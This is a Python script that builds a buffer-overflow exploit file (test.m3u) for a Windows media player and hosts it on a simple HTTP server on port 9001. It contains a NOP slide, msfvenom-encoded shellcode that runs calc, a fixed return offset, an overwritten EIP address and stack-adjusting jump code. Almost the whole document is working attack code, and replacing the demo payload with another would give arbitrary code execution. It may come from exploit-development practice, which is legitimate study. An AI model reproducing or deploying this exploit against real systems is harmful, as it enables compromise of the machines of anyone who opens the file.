#!/usr/bin/python

import SocketServer
import SimpleHTTPServer

# writes exploit to a .m3u file
def write_exploit():
    # creates a file in the current directory
    filename = "test.m3u"
    file = open(filename, "w")
    
    # pattern offset is 337
    
    # nopslide to land in
    prenops = "\x90" * 400
    ret = 26070
    
    # msfvenom -p windows/exec CMD="calc" -f python -b "\x00\x09\x0a" --encoder x86/shikata_ga_nai
    buf =  ""
    buf += "\xdb\xcd\xd9\x74\x24\xf4\x58\x2b\xc9\xba\x28\x34\x95"
    buf += "\x9a\xb1\x30\x31\x50\x18\x83\xe8\xfc\x03\x50\x3c\xd6"
    buf += "\x60\x66\xd4\x94\x8b\x97\x24\xf9\x02\x72\x15\x39\x70"
    buf += "\xf6\x05\x89\xf2\x5a\xa9\x62\x56\x4f\x3a\x06\x7f\x60"
    buf += "\x8b\xad\x59\x4f\x0c\x9d\x9a\xce\x8e\xdc\xce\x30\xaf"
    buf += "\x2e\x03\x30\xe8\x53\xee\x60\xa1\x18\x5d\x95\xc6\x55"
    buf += "\x5e\x1e\x94\x78\xe6\xc3\x6c\x7a\xc7\x55\xe7\x25\xc7"
    buf += "\x54\x24\x5e\x4e\x4f\x29\x5b\x18\xe4\x99\x17\x9b\x2c"
    buf += "\xd0\xd8\x30\x11\xdd\x2a\x48\x55\xd9\xd4\x3f\xaf\x1a"
    buf += "\x68\x38\x74\x61\xb6\xcd\x6f\xc1\x3d\x75\x54\xf0\x92"
    buf += "\xe0\x1f\xfe\x5f\x66\x47\xe2\x5e\xab\xf3\x1e\xea\x4a"
    buf += "\xd4\x97\xa8\x68\xf0\xfc\x6b\x10\xa1\x58\xdd\x2d\xb1"
    buf += "\x03\x82\x8b\xb9\xa9\xd7\xa1\xe3\xa7\x26\x37\x9e\x85"
    buf += "\x29\x47\xa1\xb9\x41\x76\x2a\x56\x15\x87\xf9\x13\xe9"
    buf += "\xcd\xa0\x35\x62\x88\x30\x04\xef\x2b\xef\x4a\x16\xa8"
    buf += "\x1a\x32\xed\xb0\x6e\x37\xa9\x76\x82\x45\xa2\x12\xa4"
    buf += "\xfa\xc3\x36\xc7\x9d\x57\xda\x08"
    # random offset to space code out and simulate small space for shellcode
    random_offset = 210
    # only 50 bytes for shellcode
    shellcode_space = 50
    # increment ESP by 96 three times, puts you in the NOPs, then jmp ESP to ride nopslide to shellcode
    jumpcode = "\x83\xc4\x60\x83\xc4\x60\x83\xc4\x60\xff\xe4"
    eip = "\x3a\xf2\xaa\x01"
    # spacer to place jumpcode at esp
    pad = "XXXX"

    attack_string = prenops + buf + ("A" * (ret - len(prenops) - len(buf))) + eip + pad + jumpcode + ("C" * (shellcode_space - len(jumpcode))) + ("D" * 210)


    file.write(attack_string)
    file.close()

def make_server():
    #define port and ip
    port = 9001
    ip = "0.0.0.0"

    # build http server
    httpServer = SocketServer.TCPServer((ip, port), SimpleHTTPServer.SimpleHTTPRequestHandler)
    print "Starting HTTP server on ", ip, " port ", port
    httpServer.serve_forever()

def main():
    write_exploit()
    make_server()

if __name__ == '__main__':
    main()
